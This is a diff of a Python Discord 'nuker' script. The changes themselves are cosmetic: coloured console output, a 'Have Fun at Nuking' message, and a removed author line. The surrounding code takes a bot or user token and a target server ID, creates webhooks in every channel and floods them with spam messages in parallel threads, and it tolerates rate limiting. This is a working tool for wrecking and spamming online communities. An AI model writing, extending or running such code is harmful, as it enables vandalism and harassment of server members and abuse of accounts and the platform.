@@ -4,13 +4,12 @@ import random
 import time
 import asyncio
 import aiohttp
-from pystyle import Colors, Center, Colorate
+from pystyle import Colors, Center, Colorate, Write
 import sys
 import json
 import threading
 import urllib3
 
-__author__ = 'WebUwU'
 
 with open('config.json', 'r') as f:
     config = json.load(f)
@@ -85,7 +84,7 @@ elif bot_or_person == "person" or bot_or_person == "user" or bot_or_person == "u
     nwords = {"Authorization": f"{token}"}
 
 else:
-    print("Invalid option!")
+    Write.Print("Invalid option!", Colors.red)
     sys.exit()
 
 guild = input("What is the guild id of the server you are nuking? -> ")
@@ -93,9 +92,11 @@ async def main():
     async with aiohttp.ClientSession() as schinken:
         async with schinken.get('https://discord.com/api/v9/users/@me', headers=nwords) as r:
             if r.status == 200:
-                print("Token is valid!")
+                Write.Print("Token is valid!", Colors.green)
+                print("")
+                print("Have Fun at Nuking")
             else:
-                print("Token is invalid!")
+                Write.Print("Token is invalid!",Colors.red)
                 sys.exit()
         async with schinken.get(f'{api}/guilds/{guild}/channels', headers=nwords) as r:
             channel_id = await r.json()
@@ -113,7 +114,7 @@ async def main():
                     webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                     threading.Thread(target=spamhook, args=(webhook,)).start()
             except:
-                print('U ratelimited af :skull:')
+                Write.Print('U ratelimited af :skull:', Colors.red)
 
 def spamhookp(hook):
     for i in range(MESSAGES_PER_CHANNEL):
